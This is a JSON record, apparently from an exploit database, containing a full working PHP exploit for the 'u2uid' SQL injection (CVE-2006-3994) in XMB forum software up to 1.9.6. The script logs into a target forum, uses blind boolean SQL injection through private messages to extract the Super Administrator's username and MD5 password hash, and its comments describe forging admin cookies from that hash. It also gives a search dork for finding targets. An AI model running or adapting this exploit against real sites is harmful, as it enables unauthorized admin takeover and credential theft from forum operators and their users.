{
  "id": "2105",
  "title": "XMB 1.9.6 - &#039;mq=off&#039; &#039;u2uid&#039; SQL Injection",
  "cve": "CVE-2006-3994",
  "vuln_type": "sqli",
  "code": "#!/usr/bin/php -q -d short_open_tag=on\r\n<?\r\necho \"XMB <= 1.9.6 'u2uid' SQL injection / admin credentials disclosure\\n\";\r\necho \"by rgod rgod@autistici.org\\n\";\r\necho \"site: http://retrogod.altervista.org\\n\";\r\necho \"dork: \\\"Powered by XMB\\\"\\n\\n\";\r\n\r\n/*\r\nworks with magic_quotes=off\r\nMysql >= 4.1 (allowing subs)\r\n*/\r\n\r\nif ($argc<5) {\r\necho \"Usage: php \".$argv[0].\" host path username password OPTIONS\\n\";\r\necho \"host:      target server (ip/hostname)\\n\";\r\necho \"path:      path to XMB \\n\";\r\necho \"user/pass: you need a valid user account\\n\";\r\necho \"Options:\\n\";\r\necho \"   -T[prefix]   specify a table prefix (default: xmb_)\\r\\n\";\r\necho \"   -d[delay]       \\\"   a delay between posts (there is an antiflood protection, default: 5)\\r\\n\";\r\necho \"   -p[port]:       \\\"   a port other than 80\\n\";\r\necho \"   -P[ip:port]:    \\\"   a proxy\\n\";\r\necho \"Examples:\\r\\n\";\r\necho \"php \".$argv[0].\" localhost /xmb/ user pass -d6\\n\";\r\necho \"php \".$argv[0].\" localhost /xmb/Files/ user pass -Txmb191_\\n\";\r\ndie;\r\n}\r\n\r\n/* software site: http://www.xmbforum.com/\r\n\r\n   tested versions:\r\n\t\t   XMB 1.9.3 Final\r\n\t\t   XMB 1.9.4 Final\r\n\t\t   XMB 1.9.5 Final\r\n                   XMB 1.9.6 Alpha\r\n\r\n  download page: http://snaps.xmbforum.com/\r\n\r\n  vulnerable code in u2u.inc.php near lines 176-219 (code taken from 1.9.5):\r\n\r\n  ...\r\n  function u2u_send($u2uid, $msgto, $subject, $message, $u2upreview) {\r\n    global $db, $self, $lang, $username, $SETTINGS, $table_u2u, $del;\r\n    global $u2uheader, $u2ufooter, $u2ucount, $u2uquota;\r\n    global $altbg1, $altbg2, $bordercolor, $borderwidth, $tablespace, $cattext, $thewidth;\r\n    global $forward, $reply;\r\n\r\n    global $sendsubmit, $savesubmit, $previewsubmit;\r\n\r\n    $username = checkInput($username, '', '', 'script', false);\r\n\r\n    if ( $self['ban'] == 'u2u' || $self['ban'] == 'both' ) {\r\n        error( $lang['textbanfromu2u'], false, $u2uheader, $u2ufooter, false, true, false, false );\r\n    }\r\n\r\n    if ( $u2ucount >= $u2uquota && $u2uquota > 0 ) {\r\n        error( $lang['u2ureachedquota'], false, $u2uheader, $u2ufooter, false, true, false, false );\r\n    }\r\n\r\n    if (isset($savesubmit)) {\r\n        if (empty($subject) || empty($message)) {\r\n            error( $lang['u2uempty'], false, $u2uheader, $u2ufooter, false, true, false, false );\r\n        }\r\n\r\n        db_u2u_insert( '', '', 'draft', $self['username'], 'Drafts', $subject, $message, 'yes', 'no' );\r\n        u2u_msg($lang['imsavedmsg'], \"u2u.php?folder=Drafts\");\r\n    }\r\n\r\n    if ( isset( $sendsubmit ) ) {\r\n        $errors = '';\r\n        if ( empty( $subject ) || empty( $message ) ) {\r\n            error( $lang['u2uempty'], false, $u2uheader, $u2ufooter, false, true, false, false );\r\n        }\r\n\t\t// floodcontrol!\r\n\t\t// $SETTINGS['floodctrl']\r\n\t\tif($db->result($db->query(\"SELECT count(u2uid) FROM $table_u2u WHERE msgfrom='$self[username]' AND dateline > \".(time()-$SETTINGS['floodctrl'])), 0) > 0) {\r\n\t\t\terror($lang['floodprotect_u2u'], false, $u2uheader, $u2ufooter, false, true, false, false );\r\n\t\t}\r\n\r\n        $u2uid = $_POST['u2uid']; // [*]   <------------- this break the global protection\r\n\r\n        if ( strstr( $msgto, \",\" ) && X_STAFF) {\r\n            $errors = u2u_send_multi_recp($msgto, $subject, $message, $u2uid);\r\n        } else {\r\n            $errors = u2u_send_recp($msgto, $subject, $message, $u2uid);\r\n        }\r\n    ...\r\n\r\n$u2uid argument is not properly sanitized before to be sent to the u2u_send_recp function:\r\n\r\n...\r\nfunction u2u_send_recp($msgto, $subject, $message, $u2uid=0) {\r\n    global $db, $table_members, $self, $SETTINGS, $lang, $onlinetime, $bbname, $adminemail, $table_u2u, $del;\r\n\r\n    $errors = '';\r\n\r\n    $query = $db->query( \"SELECT username, email, lastvisit, ignoreu2u, emailonu2u, status FROM $table_members WHERE username='\" . trim( $msgto ) . \"'\" );\r\n    if ( $rcpt = $db->fetch_array( $query ) ) {\r\n        $ilist = array_map( 'trim', explode( \",\", $rcpt['ignoreu2u'] ) );\r\n        if ( !in_array( $self['username'], $ilist ) || X_ADMIN ) {\r\n            $username = $rcpt['username'];\r\n            db_u2u_insert( $username, $self['username'], 'incoming', $username, 'Inbox', $subject, $message, 'no', 'yes' );\r\n            if ( $self['saveogu2u'] == 'yes' ) {\r\n                db_u2u_insert( $username, $self['username'], 'outgoing', $self['username'], 'Outbox', $subject, $message, 'no', 'yes' );\r\n            }\r\n            //u2u to trash ;)\r\n            if($del == \"yes\" && $u2uid > 0){\r\n                   $db->query( \"UPDATE $table_u2u SET folder='Trash' WHERE u2uid='$u2uid' AND owner='$self[username]'\" ); // [**] affected query\r\n            }\r\n...\r\n\r\nthere is a global protection in xmb.php but [*[ totally break the rules, so,\r\nwith magic_quotes_gpc=off, we have sql injection in [**], affected query could become\r\n\r\nUPDATE xmb_u2u SET folder='Trash' WHERE u2uid='9999999999' or (1=(SELECT(IF((ASCII(SUBSTRING(password,1,1))=48),1,0)) FROM xmb_members WHERE status='Super Administrator') AND owner='rgod'/*' AND owner='rgod'\r\n\r\nbecause MySQL >= 4.1 allows SELECT subquery.\r\n\r\nBy sending yourself private messages, trashing them and resend you can\r\nask true/false questions to the database to extract admin username/password hash pair\r\n\r\nyou do not need to force the md5 hash, you can set a new cookie like this:\r\n\r\nxmbuser=[admin user]; xmbpw=[md5 hash];\r\n\r\nto act as admin\r\n\t\t\t\t\t\t\t\t\t      */\r\n\r\nerror_reporting(0);\r\nini_set(\"max_execution_time\",0);\r\nini_set(\"default_socket_timeout\",5);\r\n\r\nfunction quick_dump($string)\r\n{\r\n  $result='';$exa='';$cont=0;\r\n  for ($i=0; $i<=strlen($string)-1; $i++)\r\n  {\r\n   if ((ord($string[$i]) <= 32 ) | (ord($string[$i]) > 126 ))\r\n   {$result.=\"  .\";}\r\n   else\r\n   {$result.=\"  \".$string[$i];}\r\n   if (strlen(dechex(ord($string[$i])))==2)\r\n   {$exa.=\" \".dechex(ord($string[$i]));}\r\n   else\r\n   {$exa.=\" 0\".dechex(ord($string[$i]));}\r\n   $cont++;if ($cont==15) {$cont=0; $result.=\"\\r\\n\"; $exa.=\"\\r\\n\";}\r\n  }\r\n return $exa.\"\\r\\n\".$result;\r\n}\r\n$proxy_regex = '(\\b\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\:\\d{1,5}\\b)';\r\nfunction sendpacketii($packet)\r\n{\r\n  global $proxy, $host, $port, $html, $proxy_regex;\r\n  if ($proxy=='') {\r\n    $ock=fsockopen(gethostbyname($host),$port);\r\n    if (!$ock) {\r\n      echo 'No response from '.$host.':'.$port; die;\r\n    }\r\n  }\r\n  else {\r\n\t$c = preg_match($proxy_regex,$proxy);\r\n    if (!$c) {\r\n      echo 'Not a valid proxy...';die;\r\n    }\r\n    $parts=explode(':',$proxy);\r\n    echo \"Connecting to \".$parts[0].\":\".$parts[1].\" proxy...\\r\\n\";\r\n    $ock=fsockopen($parts[0],$parts[1]);\r\n    if (!$ock) {\r\n      echo 'No response from proxy...';die;\r\n\t}\r\n  }\r\n  fputs($ock,$packet);\r\n  if ($proxy=='') {\r\n    $html='';\r\n    while (!feof($ock)) {\r\n      $html.=fgets($ock);\r\n    }\r\n  }\r\n  else {\r\n    $html='';\r\n    while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {\r\n      $html.=fread($ock,1);\r\n    }\r\n  }\r\n  fclose($ock);\r\n  #debug\r\n  #echo \"\\r\\n\".$html;\r\n}\r\n\r\n$host=$argv[1];\r\n$path=$argv[2];\r\n$user=$argv[3];\r\n$pass=$argv[4];\r\n$port=80;\r\n$proxy=\"\";\r\n$prefix=\"xmb_\";\r\n$delay=\"5\";\r\nfor ($i=3; $i<=$argc-1; $i++){\r\n$temp=$argv[$i][0].$argv[$i][1];\r\nif ($temp==\"-p\")\r\n{\r\n  $port=str_replace(\"-p\",\"\",$argv[$i]);\r\n}\r\nif ($temp==\"-P\")\r\n{\r\n  $proxy=str_replace(\"-P\",\"\",$argv[$i]);\r\n}\r\nif ($temp==\"-T\")\r\n{\r\n  $prefix=str_replace(\"-T\",\"\",$argv[$i]);\r\n}\r\nif ($temp==\"-d\")\r\n{\r\n  $delay=str_replace(\"-d\",\"\",$argv[$i]);\r\n}\r\n}\r\n\r\nfunction my_encode($my_string)\r\n{\r\n  $encoded=\"CHAR(\";\r\n  for ($k=0; $k<=strlen($my_string)-1; $k++)\r\n  {\r\n    $encoded.=ord($my_string[$k]);\r\n    if ($k==strlen($my_string)-1) {$encoded.=\")\";}\r\n    else {$encoded.=\",\";}\r\n  }\r\n  return $encoded;\r\n}\r\n\r\n$data =\"username=\".$user;\r\n$data.=\"&password=\".$pass;\r\n$data.=\"&profile_user_id=\".$profile_user_id;\r\n$data.=\"&hide=1\";\r\n$data.=\"&secure=yes\";\r\n$data.=\"&loginsubmit=Login\";\r\n$packet =\"POST \".$path.\"misc.php?action=login HTTP/1.0\\r\\n\";\r\n$packet.=\"Host: \".$host.\"\\r\\n\";\r\n$packet.=\"Connection: Close\\r\\n\";\r\n$packet.=\"Content-Type: application/x-www-form-urlencoded\\r\\n\";\r\n$packet.=\"Content-Length: \".strlen($data).\"\\r\\n\\r\\n\";\r\n$packet.=$data;\r\nsendpacketii($packet);\r\n$temp=explode(\"Set-Cookie: \",$html);\r\n$cookie=\"\";\r\nfor ($i=1; $i<count($temp); $i++)\r\n{\r\n  $temp2=explode(\" \",$temp[$i]);\r\n  $temp3=explode(\"\\r\",$temp2[0]);\r\n  if (!strstr($temp3[0],\";\")){$temp3[0]=$temp3[0].\";\";}\r\n  $cookie.=\" \".$temp3[0];\r\n}\r\nif (($cookie=='') | (!strstr($cookie,\"xmbuser\")) | (!strstr($cookie,\"xmbpw\"))){echo \"Unable to login...\";die;}\r\nelse {echo \"cookie ->\".$cookie.\"\\r\\n\";}\r\n\r\n//mqg check...\r\n$sql=\"999999'\";\r\necho \"sql -> \".$sql.\"\\r\\n\";\r\n$sql=urlencode($sql);\r\n$data =\"u2uid=\".$sql;\r\n$data.=\"&msgto=\".$user;\r\n$data.=\"&subject=hello\";\r\n$data.=\"&message=hellohellohello\";\r\n$data.=\"&del=yes\";\r\n$data.=\"&sendsubmit=1\";\r\n$packet =\"POST \".$path.\"u2u.php?action=send HTTP/1.0\\r\\n\";\r\n$packet.=\"Referer: http://\".$host.$path.\"u2u.php\\r\\n\";\r\n$packet.=\"Host: \".$host.\"\\r\\n\";\r\n$packet.=\"Connection: Close\\r\\n\";\r\n$packet.=\"Content-Type: application/x-www-form-urlencoded\\r\\n\";\r\n$packet.=\"Cookie: \".$cookie.\"\\r\\n\";\r\n$packet.=\"Content-Length: \".strlen($data).\"\\r\\n\\r\\n\";\r\n$packet.=$data;\r\nsendpacketii($packet);\r\nsleep($delay);\r\nif (!strstr($html,\"MySQL has encountered an unknown error\"))\r\n{\r\n//debug\r\n//echo $html;\r\ndie(\"magic_quotes_gpc On here...\");\r\n}\r\nelse\r\n{\r\necho \"mqg off, Ok, let's go...\\n\";}\r\n$packet =\"GET \".$path.\"u2u.php?action=emptytrash HTTP/1.0\\r\\n\";\r\n$packet.=\"Referer: http://\".$host.$path.\"u2u.php\\r\\n\";\r\n$packet.=\"Host: \".$host.\"\\r\\n\";\r\n$packet.=\"Connection: Close\\r\\n\";\r\n$packet.=\"Cookie: \".$cookie.\"\\r\\n\\r\\n\";\r\nsendpacketii($packet);\r\n\r\n$md5s[0]=0;//null\r\n$md5s=array_merge($md5s,range(48,57)); //numbers\r\n$md5s=array_merge($md5s,range(97,102));//a-f letters\r\n//print_r(array_values($md5s));\r\n$j=1;\r\n$password=\"\";\r\nwhile (!strstr($password,chr(0)))\r\n{\r\n  for ($i=0; $i<=255; $i++)\r\n  {\r\n    if (in_array($i,$md5s))\r\n      {\r\n        $sql=\"999999'/**/or/**/(1=(SELECT(IF((ASCII(SUBSTRING(password,\".$j.\",1))=\".$i.\"),1,0))/**/FROM/**/\".$prefix.\"members/**/WHERE/**/status=\".my_encode(\"Super Administrator\").\") AND owner=\".my_encode($user).\")/*\";\r\n        echo \"sql -> \".$sql.\"\\r\\n\";\r\n        $sql=urlencode($sql);\r\n        $data =\"u2uid=\".$sql;\r\n        $data.=\"&msgto=\".$user; //send to yourself\r\n        $data.=\"&subject=hello\";\r\n        $data.=\"&message=hellohellohello\";\r\n        $data.=\"&del=yes\";\r\n        $data.=\"&sendsubmit=1\";\r\n        $packet =\"POST \".$path.\"u2u.php?action=send HTTP/1.0\\r\\n\";\r\n        $packet.=\"Referer: http://\".$host.$path.\"u2u.php\\r\\n\";\r\n        $packet.=\"Host: \".$host.\"\\r\\n\";\r\n        $packet.=\"Connection: Close\\r\\n\";\r\n        $packet.=\"Content-Type: application/x-www-form-urlencoded\\r\\n\";\r\n        $packet.=\"Cookie: \".$cookie.\"\\r\\n\";\r\n        $packet.=\"Content-Length: \".strlen($data).\"\\r\\n\\r\\n\";\r\n        $packet.=$data;\r\n        sendpacketii($packet);\r\n        sleep($delay);//ah we have an antiflood protection, so wait 5 seconds\r\n        $packet =\"GET \".$path.\"u2u.php?folder=Trash HTTP/1.0\\r\\n\";\r\n        $packet.=\"Referer: http://\".$host.$path.\"u2u.php\\r\\n\";\r\n        $packet.=\"Host: \".$host.\"\\r\\n\";\r\n        $packet.=\"Connection: Close\\r\\n\";\r\n        $packet.=\"Cookie: \".$cookie.\"\\r\\n\\r\\n\";\r\n        sendpacketii($packet);\r\n        if (strstr($html,\"u2uid=\"))\r\n\t{ $password.=chr($i);\r\n\t  echo \"password -> \".$password.\"[???]\\r\\n\";\r\n          $packet =\"GET \".$path.\"u2u.php?action=emptytrash HTTP/1.0\\r\\n\";\r\n          $packet.=\"Referer: http://\".$host.$path.\"u2u.php\\r\\n\";\r\n          $packet.=\"Host: \".$host.\"\\r\\n\";\r\n          $packet.=\"Connection: Close\\r\\n\";\r\n          $packet.=\"Cookie: \".$cookie.\"\\r\\n\\r\\n\";\r\n          sendpacketii($packet);\r\n\t  sleep(2);\r\n\t  break;\r\n\t}\r\n\r\n      }\r\n    if ($i==255) {die(\"Exploit failed...\");}\r\n    }\r\n  $j++;\r\n}\r\n$packet =\"GET \".$path.\"u2u.php?action=emptytrash HTTP/1.0\\r\\n\";\r\n$packet.=\"Referer: http://\".$host.$path.\"u2u.php\\r\\n\";\r\n$packet.=\"Host: \".$host.\"\\r\\n\";\r\n$packet.=\"Connection: Close\\r\\n\";\r\n$packet.=\"Cookie: \".$cookie.\"\\r\\n\\r\\n\";\r\nsendpacketii($packet);\r\n\r\n$unused = array('<', '>', '|', '\"', '[', ']', '\\\\', ',', '@', '\\'', ' ');\r\n$j=1;\r\n$admin=\"\";\r\nwhile (!strstr($admin,chr(0)))\r\n{\r\n  for ($i=0; $i<=255; $i++)\r\n  {\r\n    if (!in_array(chr($i),$unused))\r\n    {\r\n        $sql=\"999999'/**/or/**/(1=(SELECT(IF((ASCII(SUBSTRING(username,\".$j.\",1))=\".$i.\"),1,0))/**/FROM/**/\".$prefix.\"members/**/WHERE/**/status=\".my_encode(\"Super Administrator\").\") AND owner=\".my_encode($user).\")/*\";\r\n        echo \"sql -> \".$sql.\"\\r\\n\";\r\n        $sql=urlencode($sql);\r\n        $data =\"u2uid=\".$sql;\r\n        $data.=\"&msgto=\".$user; //send to yourself\r\n        $data.=\"&subject=hello\";\r\n        $data.=\"&message=hellohellohello\";\r\n        $data.=\"&del=yes\";\r\n        $data.=\"&sendsubmit=1\";\r\n        $packet =\"POST \".$path.\"u2u.php?action=send HTTP/1.0\\r\\n\";\r\n        $packet.=\"Referer: http://\".$host.$path.\"u2u.php\\r\\n\";\r\n        $packet.=\"Host: \".$host.\"\\r\\n\";\r\n        $packet.=\"Connection: Close\\r\\n\";\r\n        $packet.=\"Content-Type: application/x-www-form-urlencoded\\r\\n\";\r\n        $packet.=\"Cookie: \".$cookie.\"\\r\\n\";\r\n        $packet.=\"Content-Length: \".strlen($data).\"\\r\\n\\r\\n\";\r\n        $packet.=$data;\r\n        sendpacketii($packet);\r\n        sleep($delay);//ah we have an antiflood protection, so wait 5 seconds\r\n        $packet =\"GET \".$path.\"u2u.php?folder=Trash HTTP/1.0\\r\\n\";\r\n        $packet.=\"Referer: http://\".$host.$path.\"u2u.php\\r\\n\";\r\n        $packet.=\"Host: \".$host.\"\\r\\n\";\r\n        $packet.=\"Connection: Close\\r\\n\";\r\n        $packet.=\"Cookie: \".$cookie.\"\\r\\n\\r\\n\";\r\n        sendpacketii($packet);\r\n        if (strstr($html,\"u2uid=\"))\r\n\t{ $admin.=chr($i);\r\n\t  echo \"admin -> \".$admin.\"[???]\\r\\n\";\r\n          $packet =\"GET \".$path.\"u2u.php?action=emptytrash HTTP/1.0\\r\\n\";\r\n          $packet.=\"Referer: http://\".$host.$path.\"u2u.php\\r\\n\";\r\n          $packet.=\"Host: \".$host.\"\\r\\n\";\r\n          $packet.=\"Connection: Close\\r\\n\";\r\n          $packet.=\"Cookie: \".$cookie.\"\\r\\n\\r\\n\";\r\n          sendpacketii($packet);\r\n\t  sleep(2);\r\n\t  break;\r\n\t}\r\n   }\r\n   if ($i==255) {die(\"Exploit failed...\");}\r\n  }\r\n$j++;\r\n}\r\n\r\necho \"--------------------------------------------------------------------\\r\\n\";\r\necho \"admin          -> \".$admin.\"\\r\\n\";\r\necho \"password (md5) -> \".$password.\"\\r\\n\";\r\necho \"--------------------------------------------------------------------\\r\\n\";\r\n\r\nfunction is_hash($hash)\r\n{\r\n if (ereg(\"^[a-f0-9]{32}\",trim($hash))) {return true;}\r\n else {return false;}\r\n}\r\n\r\nif (is_hash($password)) {echo \"Exploit succeeded...\";}\r\nelse {echo \"Exploit failed...\";}\r\n\r\n?>\r\n\r\n# milw0rm.com [2006-08-01]",
  "url": "https://www.exploit-db.com/exploits/2105"
}